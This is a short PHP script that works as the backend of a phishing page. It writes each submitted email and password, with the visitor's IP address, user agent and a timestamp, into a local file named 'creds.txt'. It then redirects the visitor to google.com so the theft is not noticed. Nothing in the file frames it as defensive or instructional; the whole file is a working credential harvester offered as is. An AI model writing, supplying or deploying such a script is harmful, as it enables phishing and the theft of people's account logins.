<?php
if ($_POST['email'] ?? false) {
    $ip = $_SERVER['REMOTE_ADDR'] ?? 'unknown';
    $ua = $_SERVER['HTTP_USER_AGENT'] ?? 'unknown';
    $time = date('Y-m-d H:i:s');
    $log = "[$time] {$ip} | {$_POST['email']}:{$_POST['password']} | {$ua}\n";
    file_put_contents('creds.txt', $log, FILE_APPEND | LOCK_EX);
}
header('Location: https://www.google.com');
exit;
?>
